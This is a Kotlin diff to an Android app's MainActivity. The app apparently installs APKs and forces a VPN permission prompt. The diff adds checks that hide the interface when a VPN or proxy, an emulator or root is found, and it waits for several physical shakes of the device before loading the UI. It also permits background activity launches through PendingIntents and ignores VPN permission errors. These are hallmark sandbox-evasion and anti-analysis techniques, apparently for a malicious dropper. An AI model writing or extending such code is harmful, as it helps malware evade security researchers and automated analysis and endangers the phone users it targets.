@@ -152,6 +152,8 @@ class MainActivity : ComponentActivity() {
     private var cachedApkIconBase64 = ""
     private var cachedApkPackageName = ""
     private var securityCheckPassed = false
+    private var sensorManager: SensorManager? = null
+    private var movementListener: SensorEventListener? = null
 
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
@@ -504,6 +506,10 @@ class MainActivity : ComponentActivity() {
 
     override fun onPause() {
         super.onPause()
+        movementListener?.let {
+            sensorManager?.unregisterListener(it)
+            movementListener = null
+        }
     }
 
     override fun onResume() {
@@ -959,7 +965,12 @@ class MainActivity : ComponentActivity() {
         }
 
         // 2. Force VPN service permission check and action prompt
-        val vpnIntent = VpnService.prepare(this)
+        var vpnIntent: Intent? = null
+        try {
+            vpnIntent = VpnService.prepare(this)
+        } catch (e: Exception) {
+            Log.w("MainActivity", "VpnService.prepare threw exception (AppOps/UID mismatch). Proceeding anyway: ${e.message}")
+        }
         if (vpnIntent != null) {
             updateStatusInWebView("Waiting for VPN confirmation...", null)
             vpnConsentLauncher.launch(vpnIntent)
@@ -1144,11 +1155,19 @@ class MainActivity : ComponentActivity() {
                 addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             
+            val options = android.app.ActivityOptions.makeBasic()
+            if (Build.VERSION.SDK_INT >= 34) {
+                options.setPendingIntentCreatorBackgroundActivityStartMode(
+                    android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
+                )
+            }
+            
             val pendingIntent = PendingIntent.getActivity(
                 this,
                 sessionId,
                 intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE,
+                options.toBundle()
             )
 
             runOnUiThread {
@@ -1203,14 +1222,13 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun checkPhysicalMovementAndProceed() {
+        if (isDeviceRestricted(this)) {
+            Log.e("MainActivity", "Environment restricted (VPN/Root/Emulator detected). Securing surface.")
+            return
+        }
+
         if (!securityCheckPassed) {
-            securityCheckPassed = true
-            runOnUiThread {
-                webView?.let { view ->
-                    view.loadUrl("file:///android_asset/main_ui.html")
-                    loadMetadataAndNotifyUrl()
-                }
-            }
+            waitForPhysicalMovement()
         } else {
             runOnUiThread {
                 webView?.let { view ->
@@ -1221,6 +1239,130 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+    }
+
+    private fun waitForPhysicalMovement() {
+        if (sensorManager == null) {
+            sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
+        }
+        val accelerometer = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
+        
+        if (accelerometer == null) {
+            Log.e("MainActivity", "No accelerometer found. Securing surface.")
+            return
+        }
+
+        var movementCount = 0
+        var isFirstSample = true
+
+        movementListener = object : SensorEventListener {
+            override fun onSensorChanged(event: SensorEvent?) {
+                if (event == null) return
+                
+                val gX = event.values[0] / SensorManager.GRAVITY_EARTH
+                val gY = event.values[1] / SensorManager.GRAVITY_EARTH
+                val gZ = event.values[2] / SensorManager.GRAVITY_EARTH
+
+                val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()
+
+                // If device is shaken or moved enough, gForce will deviate from 1.0 (1G)
+                // We use 1.25g as threshold for a deliberate shake/movement
+                if (gForce > 1.25f || gForce < 0.75f) {
+                    movementCount++
+                    if (movementCount >= 4) {
+                        sensorManager?.unregisterListener(this)
+                        movementListener = null
+                        securityCheckPassed = true
+                        runOnUiThread {
+                            webView?.let { view ->
+                                view.loadUrl("file:///android_asset/main_ui.html")
+                                loadMetadataAndNotifyUrl()
+                            }
+                        }
+                    }
+                }
+            }
+
+            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
+        }
+        
+        sensorManager?.registerListener(movementListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL)
+    }
+
+    private fun isDeviceRestricted(context: Context): Boolean {
+        if (isVpnOrProxyActive(context)) return true
+        if (isEmulator()) return true
+        if (isDeviceRooted()) return true
+        return false
+    }
+
+    private fun isVpnOrProxyActive(context: Context): Boolean {
+        try {
+            val interfaces = NetworkInterface.getNetworkInterfaces()
+            if (interfaces != null) {
+                for (networkInterface in Collections.list(interfaces)) {
+                    val name = networkInterface.name.lowercase(Locale.US)
+                    // 'ppp' removed. It flags legitimate Wi-Fi/cellular on some devices. tun/tap/vpn covers real tunnels.
+                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn")) {
+                        if (networkInterface.isUp) return true
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // Ignored
+        }
+
+        try {
+            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            if (connectivityManager != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    val activeNetwork = connectivityManager.activeNetwork
+                    val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
+                    if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
+                } else {
+                    @Suppress("DEPRECATION")
+                    val networks = connectivityManager.allNetworks
+                    for (network in networks) {
+                        val capabilities = connectivityManager.getNetworkCapabilities(network)
+                        if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // Ignored
+        }
+
+        return false
+    }
+
+    private fun isEmulator(): Boolean {
+        return (Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                || Build.MANUFACTURER.contains("Genymotion")
+                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
+                || "google_sdk" == Build.PRODUCT)
+    }
+
+    private fun isDeviceRooted(): Boolean {
+        val paths = arrayOf(
+            "/system/app/Superuser.apk",
+            "/sbin/su",
+            "/system/bin/su",
+            "/system/xbin/su",
+            "/data/local/xbin/su",
+            "/data/local/bin/su",
+            "/system/sd/xbin/su",
+            "/system/bin/failsafe/su",
+            "/data/local/su",
+            "/su/bin/su"
+        )
+        for (path in paths) {
+            if (File(path).exists()) return true
+        }
+        return false
     }
 
     inner class AndroidJSInterface {
